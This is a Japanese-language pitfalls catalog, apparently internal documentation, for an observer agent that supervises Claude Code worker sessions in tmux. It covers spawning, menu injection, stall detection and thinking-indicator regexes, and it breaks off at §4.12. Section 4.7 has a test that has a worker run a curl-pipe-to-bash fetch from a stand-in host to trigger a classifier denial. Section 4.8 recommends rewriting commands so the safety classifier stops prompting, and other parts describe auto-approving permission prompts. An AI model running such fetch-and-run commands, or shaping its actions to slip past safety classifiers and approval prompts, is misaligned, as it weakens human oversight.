# Observer Pitfalls Catalog

su-observer が繰り返し踏み続ける落とし穴の集積。起動時に Step 0 で Read され、失敗の再発を防ぐ。
セッション終了時に `doobidoo` に `observer-pitfall` タグで保存された新規失敗は、後日このカタログに追記する。

---

## 0. Memory Principles（記憶層の使い分け — MUST）

| 層 | 格納 | マシン間共有 | 用途 | 寿命 |
|----|-----|:-:|------|------|
| **Long-term** | **doobidoo (Memory MCP)** | 〇 | cross-machine 学習 — 失敗/教訓/Wave サマリ/介入記録 | 永続 |
| Working Memory Ext | `.supervisor/working-memory.md` | × (gitignore) | 同ホスト compaction 復帰 | 1 compaction |
| Compressed Memory | session context | × | session 内 | session 生存中 |
| auto-memory | `~/.claude/projects/<slug>/memory/MEMORY.md` | **×（ホストローカル）** | 同ホスト continuity の簡易 pointer | project 生存中 |

**MUST**: 次セッションや他ホストで再利用したい知見はすべて doobidoo に保存。tag 必須。
**MUST**: auto-memory (MEMORY.md) は「同ホスト同プロジェクトの daily continuity 補助」限定。cross-machine 知見をここで管理しない（ホスト間で失われる）。
**MUST**: doobidoo 保存時の標準タグ:
- `observer-pitfall` — 失敗パターン（次回回避）
- `observer-lesson` — 成功手法・技法
- `observer-wave` — Wave 完了サマリ
- `observer-intervention` — 実施した介入記録

---

## 1. cld-spawn 使い方（spawn ミスで同じ失敗を繰り返すな）

| # | Pitfall | 対策 |
|---|---------|------|
| 1.1 | `--help` / `-h` / `--version` を cld-spawn に渡すと option として認識されず、prompt として誤注入され空の Claude Code セッションが起動する | **`scripts/spawn-controller.sh` 経由必須**。直接 cld-spawn 呼び出しを SKILL.md で禁止済み |
| 1.2 | cld-spawn の prompt に `/twl:<skill>` を含めないと、Claude Code 起動時に skill が invoke されず、skill の標準フロー（Phase 1-4、specialist review、explore-summary 必須チェック等）が走らない | spawn-controller.sh が自動で `/twl:<skill>` を prepend |
| 1.3 | `/twl:co-issue` を呼び出しても `explore-summary` が不在だと Step 0.5 で失敗または品質劣化 | **co-issue の前に co-explore を必ず先行**。co-issue SKILL.md の `.explore/<N>/summary.md` 必須を遵守 |
| 1.4 | ウィンドウ名の自動生成が競合すると同一 window に上書き起動される | spawn-controller.sh が `wt-<skill>-<HHMMSS>` で一意化 |
| 1.5 | `--cd` を付けずに spawn すると現 CWD で Worker 起動、worktree 指定が漏れる | co-autopilot 系 Worker は orchestrator が `--cd <worktree>` を付ける。observer からの controller spawn は main/ で良い |

---

## 2. session-comm.sh inject（介入の基本プリミティブ）

| # | Pitfall | 対策 |
|---|---------|------|
| 2.1 | inject 後に Claude Code が "Press up to edit queued messages" 状態で未送信停滞 | inject 後 5-10 秒で `tmux capture-pane -t <win> -p -S -3 \| grep -q "Press up"` → 残留なら `tmux send-keys -t <win> Enter`。**二重防御**: `autopilot-orchestrator.sh detect_input_waiting()` 側でも `queued_message_residual` pattern を検知し debounce 2-cycle 後に Enter を auto-recovery（#1580）。observer-side 手動対応とのデュアル防護体制。**全 stuck pattern の SSoT**: `plugins/twl/refs/stuck-patterns.yaml`（#1582）— 新規 pattern 追加・変更は必ず YAML を更新し consumer は `stuck-patterns-lib.sh` 経由で参照。|
| 2.2 | `session-comm.sh inject -l` は literal 送信のため Tab/Enter 特殊キーを解釈しない | multiSelect UI では数字 inject 後に `tmux send-keys -t <win> Tab` / `Enter` を明示送信 |
| 2.3 | 質問内容を読まずに inject してしまう（「Phase 進んだろう」推測注入） | **キャプチャで質問を読めないなら inject 禁止（MUST NOT）**。pipe-pane log → capture-pane -S -500 → Layer 2 ユーザーエスカレート の段階的 fallback。**variant: AskUserQuestion（数字選択 UI）に generic 文字列を inject → no-op（§2.4）** — 観測した pane 内容に番号付きメニューが含まれる場合は「処理を続行してください。」等の文字列を inject してはならない |
| 2.4 | AskUserQuestion の回答形式は `[A]/[B]/[C]` ではなく **番号（"1", "2"）またはメニュー項目テキスト** | pipe-pane log を ANSI strip して `Enter.?to.?select` の周辺を読み、番号 inject。**orchestrator 実装側の責務**: `tmux capture-pane -p -S -50` で pane 末尾を取得 → 選択肢テキストを parse → deny-pattern `(?i)(delete\|remove\|reset\|destroy\|drop\|wipe\|purge\|truncate\|force\|kill\|terminate)` に該当しない最小番号を inject。parse 失敗または全選択肢が deny-pattern の場合は `reason=unclassified_askuserquestion` で failed 化（inject を試みない）。**variant: cursor marker (`❯` / `►` / `▶` / `→`) 付き specialist 選択 UI は §2.5 参照**。**[実装済 #1145, Option A]**: `cld-observe-any` に `auto_inject_menu()` を統合。`OBSERVER_AUTO_INJECT_ENABLE=1` 設定時のみ自動 inject（conservative default: disabled）。ERE 実装: `grep -iqE '(delete\|remove\|reset\|destroy\|drop\|wipe\|purge\|truncate\|force\|kill\|terminate)'`（POSIX ERE 環境。PCRE `(?i)` 不使用）。自動 inject は本チャネルのスコープ外（安全確認なしの自動承認・拒否禁止）の記述は廃止 → #1145 で実装済み（opt-in モデル） |
| 2.5 | **specialist_handoff_menu**（5th pattern）: Claude Code の `specialist` 選択 UI が cursor marker (`❯` / `►` / `▶` / `→`) 付きで表示される → 旧 regex `^[[:space:]]*[1-9]\. .+$` は `❯` を `[[:space:]]` と認識せず、全行を分類不能 (`unclassified_input_waiting`) として扱い即 failed 化する（dogfood #940/#942 Phase AA Wave 1-2 実例） | **対策（#956 実装）**: regex を `^[[:space:]❯►▶→]*[1-9][0-9]*[.):] .+$`（`LC_ALL=C.UTF-8`）に拡張。**context 文脈**: pane 内に `specialist`/`PASS`/`NEEDS_WORK`/`Phase 3`/`Phase 4` かつ `[D]` label が同時存在 → `specialist_handoff_menu` 認定、`[D]` 番号を最優先 inject。**fallback 改善**: unclassified 初検知は `.unclassified_debounce_ts` に timestamp 保存して pending 継続（10s debounce）、連続 2 回検知で `reason=unclassified_input_waiting_confirmed` + pane 内容を `.autopilot/trace/unclassified-<sid>-<ts>.log` に保存して failed 化。**CI locale**: bats test 冒頭で `export LC_ALL=C.UTF-8` 必須（`LC_ALL=C` 下でマルチバイト誤動作） |

---

## 3. explore / controller flow（skill 規約）

| # | Pitfall | 対策 |
|---|---------|------|
| 3.1 | co-issue を explore-summary なしで起動 → 品質劣化、Phase 0.5 で停止 | 必ず co-explore 先行。observer が proxy 対話で最低 1 往復探索 |
| 3.2 | Phase 3 specialist review を「効率化」名目でスキップ | **MUST**: 3 specialist 全実行（issue-critic / issue-feasibility / worker-codex-reviewer）。refined ラベルは review 済みの印 |
| 3.3 | critic / feasibility agent が tool_uses 25-30 で打ち切られ最終 report なし | codex-reviewer 優先（1 tool call で完走）。critic/feasibility は「3 ファイルだけ Read」等 tool_uses 上限を minimize する指示で spawn |
| 3.4 | co-issue / co-architect spawn 後「指示待ち」に戻ってしまう | **proxy 対話ループ必須** — observer がユーザー代理で対話継続（SKILL.md「対話型コントローラーとの proxy 対話」セクション） |
| 3.5 | spawn プロンプトにユーザー文脈が不足、controller が迷子 | **observer 固有文脈のみ**を包含（§10 参照、自律取得可能情報は MUST NOT）（SKILL.md「spawn プロンプトの文脈包含」セクション） |
| 3.6 | co-autopilot は能動 observe（cld-observe-loop）、co-issue / co-architect は proxy 対話 — 混同すると監視漏れ | controller ごとの観察モードを明示判別（SKILL.md「controller spawn が必要な場合」→「起動パターン」） |
| 3.7 | co-issue Phase 4 aggregate stuck (進行停止): specialist 完了後 `/twl:issue-review-aggregate` が >5 min 無進行 — `§3.3`（specialist 打ち切り）とは異なり **specialists は完了済み**、aggregate phase 自体で停止 | `[AGGREGATE-STEP]` ログ（step=N status=enter\|exit ts=ISO8601）を有効にし pane mtime 監視で早期検知。回避: Pilot が round 1 findings を直接消費する [B] manual fix path（#1376 / source: #1038） |

#### §3.7 補足: co-issue Phase 4 aggregate stuck 詳細

**発生事象（2026-05-04 09:50 JST、Issue #1038 refine 中）**:
Worker session `coi-17778543-0`（Sonnet 4.6）が `/twl:issue-review-aggregate` skill load 後、>5 min 無変化で停止。pane tail に新規出力なし。Monitor の STAGNATE 検知も未発火。

**§3.3 との区別（MUST）**:
- **§3.3（specialist 打ち切り）**: critic / feasibility agent が tool_uses 25-30 で打ち切られ最終 report なし。**specialist 自体が不完全な状態で終了**する
- **§3.7（aggregate stuck）**: 全 specialist は完了済み（findings あり）。`/twl:issue-review-aggregate` を呼び出した **aggregate phase 自体**で停止する。§3.3 のガード（`WARNING: 構造化出力なしで完了`）とは異なる症状

**`[AGGREGATE-STEP]` ログ機構**:

`commands/issue-review-aggregate.md` の Step 1〜6 各入退出時に以下を stdout に出力:
```
[AGGREGATE-STEP] step=<N> status=enter ts=<ISO8601>
[AGGREGATE-STEP] step=<N> status=exit ts=<ISO8601>
```

stuck 検知 grep パターン:
```bash
tmux capture-pane -t <worker-win> -p -S -200 | grep -E '^\[AGGREGATE-STEP\] step=[0-9]+ status=(enter|exit) ts='
```

**pane 監視 regex（>5 min 無進行の検知）**:

aggregate phase の stuck を検知するには、`[AGGREGATE-STEP]` ログの最終出力 mtime を監視する:

```bash
# aggregate phase 開始後、[AGGREGATE-STEP] の最終出力から経過時間を確認
# GNU date (Linux) 専用。POSIX ERE grep を使用（§2.4 方針に準拠）
LAST_TS=$(tmux capture-pane -t <worker-win> -p -S -500 \
  | grep -E '^\[AGGREGATE-STEP\]' \
  | tail -1 \
  | grep -oE 'ts=[0-9T:Z]+' \
  | sed 's/ts=//')
if [[ -n "$LAST_TS" ]]; then
  ELAPSED=$(( $(date -u +%s) - $(date -d "$LAST_TS" +%s) ))
  if (( ELAPSED > 300 )); then  # >5 min
    echo "STAGNATE: aggregate stuck 検知 — 最終ログから ${ELAPSED}s 経過"
  fi
fi
```

代替（pane キャプチャのハッシュ比較 — A1 多指標）:
```bash
HASH1=$(tmux capture-pane -t <worker-win> -p | sha256sum)
sleep 60
HASH2=$(tmux capture-pane -t <worker-win> -p | sha256sum)
[[ "$HASH1" == "$HASH2" ]] && echo "A1: STAGNATE candidate"
```

**回避手順（[B] manual fix path）**:
1. Pilot が specialist findings（round 1）を直接取得: `cat <snapshot>/specialist-results-*.md`
2. findings を消費して body v2 を手動生成（`co-issue` aggregate step 相当）
3. dual-write: label 先（`refined`）→ Status=Refined 後（ADR-024 準拠）
4. retrospective: 今回の stuck 事象を doobidoo に `co-issue-aggregate-stuck` タグで保存

**再現確認方法**（atomic LLM skill のため手動確認手順で代替）:

1. `/twl:issue-review-aggregate` を実行し、pane capture で `[AGGREGATE-STEP]` ログが出力されることを確認:
   ```bash
   tmux capture-pane -t <worker-win> -p -S -100 | grep '\[AGGREGATE-STEP\]'
   # 期待出力例:
   # [AGGREGATE-STEP] step=1 status=enter ts=2026-05-04T01:58:11Z
   # [AGGREGATE-STEP] step=1 status=exit ts=2026-05-04T01:58:13Z
   # [AGGREGATE-STEP] step=2 status=enter ts=2026-05-04T01:58:13Z
   ```
2. Step 1〜6 全ての enter/exit ログが出力されれば実装 PASS
3. stuck 発生シミュレーション: Step 3 enter ログ後に Step 3 exit ログが >5 min 出ない場合、上記 pane 監視 regex でアラート

**関連統計収集（doobidoo運用）**:
stuck 発生時は `co-issue-aggregate-stuck` タグで以下を保存: Worker session 名（`coi-*`）・aggregate skill load timestamp・最終 `[AGGREGATE-STEP]` 出力 timestamp（`62574c71` に続く記録）

**参照**: Issue #1376（ログ機構追加）、source Issue #1038（発生事象）、§3.3（specialist 打ち切り — 区別注意）

---

## 4. Monitor tool（監視チャネル）

| # | Pitfall | 対策 |
|---|---------|------|
| 4.1 | Monitor tool だけ起動して cld-observe-loop / cld-observe-any を併用しない → Worker 群の静寂を「正常」と誤判定。さらに `--pattern 'ap-.*'` は Pilot window（`wt-co-*`）を対象外にするため、Pilot-only chain 完遂が silent になる（Issue #948 実測: 40 分間 silent timeout） | **MUST**: Monitor tool + `cld-observe-any --pattern '(ap-|wt-co-).*'` を同時起動（SKILL.md §supervise 1 iteration 表）。`wt-co-*` を pattern に必ず含める |
| 4.2 | Issue body テキストが Monitor のパターンに一致して false positive 大量発生 | grep を行頭マッチ（`^●`）に厳密化、または最後 3 行のみ監視 |
| 4.3 | LLM の Thinking/Brewing/Concocting 中に STAGNATE を誤検知 | **A2 LLM indicator が存在する場合、[PHASE-COMPLETE]/[REVIEW-READY]/[MENU-READY]/[FREEFORM-READY]/[STAGNATE] を絶対に emit しない**（SKILL.md L110） |
| 4.4 | `session-state.sh state` 単独で判定 → 誤検出多発 | **MUST NOT**: 単独使用禁止。A1〜A6 の多指標 AND 判定（SKILL.md L102-108） |
| 4.5 | Pilot 完了シグナル `Churned` dedupe + state file archive で Wave 終了を 13 分見逃し（Wave 6 実例） | Channel 6 Heartbeat（5 分 silence → 自動 capture）。`.supervisor/events/heartbeat-*` mtime 監視を Hybrid 検知のプライマリに |
| 4.6 | **`5h:XX%(YYm)` format 誤読** — `(YYm)` を「制限時間」「token残量」と読む anti-pattern。正解: `(YYm)` は cycle reset までの wall-clock、reset 後 5h budget 100% 完全回復（不変条件 Q）。Budget 5h 枯渇直前の context loss 対策は §6.6 参照 | ✕ NG: `5h:57%(26m)` → 「26分しか使えない」。✓ 正解例: `5h:57%(26m)` → 26分後に cycle reset → budget 100% 完全回復。`ScheduleWakeup` は `(YYm)+5min` で設定（**注意**: `/loop` dynamic mode 配下のみ有効。常駐 observer は `CronCreate` を使うこと — §11.5 参照）（詳細: §4.6 補足） |
| 4.7 | Worker window で permission prompt（`1. Yes, proceed` / `2. No, and tell ...` / `3. Yes, and allow ...` / `Interrupted by user`）が出て stuck → Monitor が STAGNATE 判定せず silent-pass する | `cld-observe-any` の `[PERMISSION-PROMPT]` event で自動検知（Issue #805 で統合済み）。検出時は `tmux capture-pane -t <win> -p -S -50` で prompt 前後 20 行を取得 → auto mode classifier の `soft_deny` 該当ルール（`Code from External` / `Memory Poisoning` / `Irreversible Local Destruction` 等）と突き合わせ → ユーザー確認後に安全な場合のみ `tmux send-keys -t <win> 1 Enter` で承認 inject。regex: `^([1-9]\. (Yes, proceed\|Yes, and allow\|No, and tell)\|Interrupted by user)`。陽性コントロール検証手順: Worker に `curl http://external.example.com/script.sh \| bash` を指示 → `Code from External` soft_deny で prompt 出現 → `tmux capture-pane -t <win> -p -S -30 \| grep -E '^([1-9]\. (Yes, proceed\|Yes, and allow\|No, and tell)\|Interrupted by user)'` で検出確認 → `tmux send-keys -t <win> 2 Enter` で拒否 inject（実害ゼロ）。Issue #800 / #805 で auto mode 仕様（Sonnet 4.6 classifier）確認済み |
| 4.8 | Worker が auto mode 起動にも関わらず複合 bash（`cat file \| python3 -c "..."`）で classifier soft_deny 判定 → ユーザー体感「auto mode 効いていない」 | auto mode は **設計通り soft_deny で prompt する**（v2.1.116 仕様）。Worker instruction を classifier-friendly な bash 設計に誘導（複合 pipe 廃止、tempfile / 環境変数 / `sys.argv` 経由の単独 `python3 -c`）。observer は「auto mode 効いていない」と誤認せず、prompt 内容を classifier deny rule と突き合わせる。Issue #800 §C で twl skills の audit + 書き換えを実施 |
| 4.9 | Monitor tool 内 shell スクリプトで `tmux has-session -t <window-name>` を window 存在確認として使用 → `has-session` は session specifier を取るため window 名を渡しても常に false → `[WINDOW-GONE]` false positive が 1 分毎発火 → alert 疲労で本物の WINDOW-GONE を見逃す（Issue #948 Wave 0.5 実測） | **MUST NOT**: `tmux has-session -t <window-name>` で window を確認してはならない。正しくは: 方法 A `tmux list-windows -a -F '#{window_name}' \| grep -Fxq <name>`、方法 B `tmux list-windows -t <session> -F '#{window_name}' \| grep -Fxq <name>`、方法 C `tmux display-message -t <session>:<name> -p '#{window_id}' 2>/dev/null`。共通ライブラリ `scripts/lib/observer-window-check.sh` の `_check_window_alive()` を使用。詳細は `refs/monitor-channel-catalog.md §window 存在確認の正しい方法` を参照 |

#### §4.6 補足: `(YYm)` format 誤読 pitfall — 不変条件 Q

**背景**: tmux status line `5h:XX%(YYm)` の `(YYm)` は次回 5h rolling budget cycle の reset までの wall-clock remaining（分）。token 残量や「あと XX 分しか使えない」という制限時間ではない。[不変条件 Q](../../refs/ref-invariants.md#invariant-q) として正典化済み。

**✕ NG 例 — anti-pattern**:
- `5h:57%(26m)` を「token 残量 26 分分しかない、停止すべき」と読む
- `(26m)` = 「制限時間 26 分」と解釈して不必要な budget-pause を発動する
- `(YYm)` を消費可能 token 残量（分）と混同する

**✓ 正解例**:
- `5h:57%(26m)` → **26 分後に 5h cycle が reset → budget 100% 完全回復**
- `5h:88%(8m)` → **8 分後に 5h cycle が reset → budget 100% 完全回復**
- `ScheduleWakeup` の `delaySeconds` は `(YYm) × 60 + 300`（cycle reset 直後 + 5 分余裕）に設定する（**注意**: `ScheduleWakeup` は `/loop` dynamic mode 配下のみ有効。常駐 observer は `CronCreate(cron="*/25 * * * *", durable=true)` を使うこと — §11.5 参照）

**具体例**（`/loop` dynamic mode 配下での budget reset 待機）:
```
status: 5h:57%(26m)
         ↑↑↑   ↑↑↑
     token 消費 57%  cycle reset まで 26 分
                     ↓
           26 分後: budget 5h:0% に完全回復
           ScheduleWakeup: delaySeconds = 26*60+300 = 1860  (/loop 配下のみ)
           常駐 observer: CronCreate(cron="*/25 * * * *", durable=true) を使うこと
```

**参照**: [不変条件 Q](../../refs/ref-invariants.md#invariant-q)、`budget-detect.sh`（`budget-pause.json` の `cycle_reset_minutes_at_pause` / `expected_reset_at` フィールド）

#### §4.7-4.8 補足: Worker auto mode 有効性確認方法

Worker pane tail に `⏵⏵ auto mode on` が出ない場合でも auto mode は有効である。`autopilot-launch.sh` は positional prompt で起動するため status bar が起動直後の対話開始メッセージで上書きされ、`⏵⏵ auto mode on` の表示が消失するが、`--permission-mode auto` flag 自体は claude プロセスに到達している（Issue #800 探索で全起動経路を検証済み）。

**確認方法 A（一次指標 — heartbeat / state file existence）:**

`autopilot-launch.sh` 起動後 5 秒以内に以下を実行する:
```bash
ls .supervisor/events/heartbeat-* 2>/dev/null || ls .supervisor/events/worker-*.json 2>/dev/null
```
1 つ以上のファイル名が出力されれば Worker 正常起動。0 件かつ exit 非 0 なら 10 秒待って再試行し、依然 0 件なら autopilot-launch.sh のログを確認する。

**確認方法 B（二次指標 — pane capture grep）:**

Worker が起動済み状態で以下を実行する:
```bash
tmux capture-pane -t <worker-win> -p -S -50 | grep -E '⏵⏵ auto mode|permission_mode'
```
1 行以上のマッチ（exit 0）で auto mode 有効と判定。マッチが 0 行でも `autopilot-launch.sh` の起動行に `--permission-mode auto` が含まれる限り auto mode は有効（pane 上の表示有無は status bar の上書きタイミングに依存）。

#### §4.10 「止まっている」5 状態多指標検知マトリクス（Issue #948 follow-up / Phase AA Wave AA.3 知見）

`session-state.sh state` 単独判定を禁止し、Pilot / Worker window 双方に対して以下 5 状態のいずれかに分類する。**A1〜A6 の多指標 AND 判定**（SKILL.md §supervise 1 iteration 参照）を各状態の判定条件に適用する:

- **A1**: `tmux capture-pane -p -S -60` の内容ハッシュ（stable / dynamic）
- **A2**: LLM thinking indicator（`Thinking/Brewing/Concocting/Sautéing/Steeping/Simmering/Marinating/Newspapering/Tomfoolering/Flummoxing/Proofing/Befuddling/Generating/Waddling/Thundering/Lollygagging` + **現在進行形のみ**。`Sautéed for N`/`Worked for N`/`Baked for N` 等の **過去形 + "for N"** は IDLE 扱い — v18 past tense filter、Phase AA Wave AA.2 実装済）
  - **SSOT**: `plugins/session/scripts/lib/llm-indicators.sh` が `LLM_INDICATORS` 配列の唯一の定義源（#1374）。参照方法: `source "$(dirname "$0")/lib/llm-indicators.sh"` または相対パスで `source`。以下3ファイルが参照: `cld-observe-any`（source）、`issue-lifecycle-orchestrator.sh`（source）、`observer-idle-check.sh`（動的 source）
  - **debounce 延長（#1087）**: `issue-lifecycle-orchestrator.sh` の `DEBOUNCE_TRANSIENT_SEC` は 120s（Sonnet 4.6 max effort thinking time 対応）。thinking indicator 検出時は `.debounce_ts` をリセットして Worker kill を防止
- **A3**: pipe-pane log mtime（active / stale）
- **A4**: `pane_dead`（tmux 窓健全性）
- **A5**: `session-state.sh`（補助のみ、単独使用禁止）
- **A6**: `[BUDGET-LOW]` tmux status line の budget 残量

| # | 状態 | A1 | A2 | A3 | A5 | 判定条件 | 期待アクション |
|---|---|---|---|---|---|---|---|
| S-1a | **IDLE**（一時的） | stable | **なし**（または過去形 + for N） | stale 可 | processing/waiting | 所有権なしの非活動（タスク進行中の一時的な非活性） | 放置可。Wave 管理なら PR/commit 存在確認で完了を確定 |
| S-1b | **IDLE 確定 (cleanup target)** | stable | なし（または過去形 + for N） | stale | processing/waiting | S-1a + completion phrase 60s 安定（`monitor-channel-catalog.md [IDLE-COMPLETED]` regex マッチ） | **`[IDLE-COMPLETED]` 発火** → observer が kill 候補として判断。SU-4 ≤10 制約圧迫回避のため速やかに `tmux kill-window` |
| S-2 | **THINKING** | dynamic | **現在進行形あり** | active | processing | LLM 活動中 | **`[PHASE-COMPLETE]/[REVIEW-READY]/[MENU-READY]/[FREEFORM-READY]/[STAGNATE]` 絶対 emit 禁止**（§4.3）。観察継続 |
| S-3 | **MENU-READY** | stable | なし | stale 可 | input-waiting | 番号付き menu（`^[[:space:]❯►▶→]*[1-9][0-9]*[.):][[:space:]].+$`）または `[y/N]`/`Do you want to proceed\?`/`Enter to select` が pane 末尾に可視 | §2.4/§2.5 の deny-pattern 回避 + 最小番号 inject、specialist_handoff_menu なら `[D]` 最優先 |
| S-4 | **REVIEW-READY** | stable | なし | active→stale 遷移 | ended/ready | `>>> 実装完了:`/`PASS`/`NEEDS_WORK`/`Phase N 完了` 等の signal。controller 別の正確な regex は `refs/pilot-completion-signals.md` 参照 | Wave 管理なら `commands/wave-collect.md` 起動。intervention-catalog pattern-7 参照 |
| S-5 | **STAGNATE** | stable ≥ 3 連続 | なし | > 600s stale (`AUTOPILOT_STAGNATE_SEC` デフォルト) | processing (false positive) | 上記 S-1〜S-4 のいずれでもない真の stuck | `intervention-catalog.md` pattern-4（Layer 1 Confirm）→ 介入。Pilot なら phase-review 手動 inject、Worker なら `session-comm.sh inject` で軽い promt |

**S-1 の区別（Issue #1117）**:
- **S-1a IDLE（一時的、継続観察）**: completion phrase 未確認、または debounce 未達。タスク進行中の一時的な非活性として放置可
- **S-1b IDLE 確定（cleanup 対象）**: completion phrase 60s 安定 → `[IDLE-COMPLETED]` 発火。`SU-4 ≤10` 制約（§4.5）圧迫回避のため速やかに kill する。**`IDLE_COMPLETED_AUTO_KILL=1` 設定済みなら observer 介入不要（自動 cleanup、#1132）**。**`IDLE_COMPLETED_AUTO_NEXT_SPAWN=1` 設定済みなら次 Wave 自動起動（#1155）**

**S-1b と §4.3（LLM-active-override）の関係**: A2 に現在進行形 indicator がある場合は S-2 THINKING 確定のため `[IDLE-COMPLETED]` 絶対 emit 禁止。`_check_idle_completed()` の C3 条件で保証済み。

**運用 MUST**:

1. **observer は状態分類を実行する前に A2 を先に評価する**。A2 に現在進行形 indicator があれば S-2 THINKING 確定、他の判定を scratch する（§4.3 LLM-active-override）
2. **S-1 と S-5 の区別は A3 mtime + A1 連続ハッシュ一致回数**。mtime stale のみでは断定せず、連続 3 回の hash 一致 AND PR/commit 不在で STAGNATE 判定
3. **Pilot 内部 chain 完遂（Worker spawn なし）の場合は S-4 signal が Worker window 由来にならない**。`refs/pilot-completion-signals.md` の controller 別 signal 表を参照し、Pilot window `wt-co-*` に対しても S-4 検知を実装する（Issue #948 対策）
4. **Monitor tool の filter は 5 状態全てを emit 可能にする**。S-2 のみ emit してしまうと silent→事後確認の落とし穴（§4.1, hash `fdfc9102`）を再発する
5. **past tense filter**: 動詞過去形 + `for [0-9]+[ms]` は **完了済** の表示。`Sautéed for 1m 30s` を S-2 扱いすると phase 境界で自動 inject が発火せず stall する（Phase AA Wave AA.2 Pilot stall 事例、Monitor v18 で修正済）

**関連参照**:
- `refs/monitor-channel-catalog.md` — チャネル定義（`[PHASE-COMPLETE]/[REVIEW-READY]/[MENU-READY]/[FREEFORM-READY]/[STAGNATE]/[BUDGET-LOW]/[PERMISSION-PROMPT]/[WINDOW-GONE]/[IDLE-COMPLETED]`）
- `refs/pilot-completion-signals.md` — controller 別 S-4 signal 一覧
- `refs/intervention-catalog.md` — 状態 × パターン × 3 層介入
- §2.5 — S-3 specialist_handoff_menu variant（cursor marker 対応）
- §4.3 — A2 LLM indicator による emit 抑制
- §4.5 — Heartbeat（5 min silence 自動 capture）で S-1 と S-5 の誤分類を防ぐ

**orchestrator-side の多指標 AND 判定の適用例（Issue #1177）**:

observer-side の A3 mtime + A1 多指標パターンは、orchestrator-side の stagnate 検知にも適用できる。`inject-next-workflow.sh` の stagnate 検知（`RESOLVE_FAIL_COUNT` 連続カウント）は、resolve 失敗が続いても Worker が state file（`.autopilot/issues/issue-${issue}.json`）の mtime を更新している場合は「実質的に進行中」と判断し、カウントをリセットする。これにより「resolve は失敗しているが Worker は活動している」状態と「真の stagnate」を区別できる:

- **mtime 進行あり**: `RESOLVE_FAIL_COUNT` リセット → stagnate タイマーが延長される（Worker が進行しているため）
- **mtime 変化なし**: `RESOLVE_FAIL_COUNT` インクリメント → 従来通り stagnate 検知が蓄積される

実装: `inject-next-workflow.sh` の `LAST_STATE_MTIME` 連想配列で mtime 履歴を管理し、stagnate 検知ブロック先頭で mtime チェックを FAIL_COUNT インクリメントより前に実施することで、exit code とは独立した progress signal として機能する。

注: `issue-lifecycle-orchestrator.sh` の `DEBOUNCE_TRANSIENT_SEC=120s`（LLM thinking time 中の transient state 保護、Worker kill 防止文脈）とは別文脈。orchestrator stagnate 検知の mtime AND 判定は inject-next-workflow.sh の RESOLVE_FAILED カウント制御であり、debounce 対象のプロセス kill とは独立した機構である。

#### §4.10.1 non-ASCII / ASCII ellipsis / bare-word 検知漏れパターン（Issue #1153）

LLM indicator 検知において以下の3つの落とし穴が確認されている。いずれも `detect_thinking()` が一部の入力テキストを検知できない原因となる。

**落とし穴 1: non-ASCII 文字を含む indicator の検知漏れ**

`grep -qiE` の文字クラス `[a-z]+` は ASCII 範囲のみを対象とするため、`Flambéing`（é は non-ASCII U+00E9）などの Unicode 文字を含む indicator が汎化 regex にヒットしない。

- **BAD**: `grep -qiE "[A-Z][a-z]+(ing)..."` — `Flambéing` の `é` で中断される
- **GOOD**: `grep -qiP "[\p{Lu}][\p{Ll}]+(ing)..."` — PCRE Unicode property で正しく動作

**落とし穴 2: ASCII ellipsis (`...`) の検知漏れ**

Claude Code が出力する thinking status には Unicode ellipsis（`…` U+2026）だけでなく ASCII 3-dot（`...`）も使われる。汎化 regex に `\.{3}` が含まれていないと ASCII ellipsis 付き indicator が検知されない。

- **BAD**: `[A-Z][a-z]+(ing)(…| for [0-9]| \([0-9])` — `Garnishing... (15s)` を検知できない
- **GOOD**: `[\p{Lu}][\p{Ll}]+(ing)(…|\.{3}| for [0-9]| \([0-9])` — ASCII `...` も検知

**落とし穴 3: bare-word indicator の欠落**

汎化 regex は接尾辞パターンに依存するため、indicator 単体（bare-word）で出現する場合は検知されないことがある。SSOT（`llm-indicators.sh`）に bare-word として明示的に追加することで安全網（safety net）を設ける。

**SSOT 三方向同期義務（Issue #1153）**

indicator の追加・削除は以下3箇所を同期すること:

1. `plugins/session/scripts/lib/llm-indicators.sh` — 実装 SSOT
2. `plugins/session/scripts/cld-observe-any` — static grep 互換コメントマニフェスト
3. `plugins/twl/skills/su-observer/scripts/lib/observer-idle-check.sh` — static grep 互換コメントマニフェスト

**同期対象 indicator 8 件（catalog 独自 / Issue #1153）**:

`Steeping`, `Simmering`, `Marinating`, `Newspapering`, `Flummoxing`, `Befuddling`, `Waddling`, `Lollygagging`

これらは pitfalls-catalog.md から逆同期された indicator であり、`llm-indicators.sh` および `cld-observe-any`、`observer-idle-check.sh` の両ファイルのコメントマニフェストに含まれること。

**Issue #1153 追加 indicator 一覧（20 件）**:

`Garnishing`, `Embellishing`, `Flambéing`, `Tomfoolering`, `Reticulating`, `Topsy-turvying`,
`Generating`, `Whisking`, `Mulling`, `Fermenting`, `Caramelizing`, `Inferring`,
`Discerning`, `Ratiocinating`, `Sleuthing`, `Investigating`, `Reviewing`, `Studying`,
`Pondering`, `Reflecting`

#### §4.11 tmux kill-window / set-option の target 解決落とし穴

**問題**: `tmux kill-window -t "$window_name"` / `tmux set-option -t "$window_name"` がウィンドウ名文字列を直接 `-t` に渡している。複数 tmux session に同名 window が存在する場合、ambiguous target エラーまたは誤 kill が発生する（Issue #1218、Issue #1142）。

**正規解決パターン**: `plugins/session/scripts/lib/tmux-resolve.sh` の `_kill_window_safe()` / `_resolve_window_target()` を使用する。

```bash
source "${SESSION_SCRIPTS}/lib/tmux-resolve.sh"

# 旧（危険）:
tmux kill-window -t "$window_name" 2>/dev/null || true

# 新（安全）:
_kill_window_safe "$window_name"

# set-option の場合:
if target=$(_resolve_window_target "$window_name"); then
    tmux set-option -t "$target" remain-on-exit on
fi
```

**適用 callsite**: `issue-lifecycle-orchestrator.sh` 11 箇所（L368, L372, L411, L526, L553, L559, L605, L645, L654, L679, L718）
注: 上記 callsite のリファクタ（`_kill_window_safe` への置換）は PR #1229 の次フェーズで実施予定。
本 PR #1229 では `lib/tmux-resolve.sh` の実装と bats テスト GREEN 化のみ。

**参照**: PR #1229、`plugins/session/tests/lib-tmux-resolve.bats`

---

#### §4.12 cld-observe-any と Monitor tool の連携落とし穴

**背景事象（2026-04-29 22:57 〜 2026-04-30 02:39、3h45m）**:
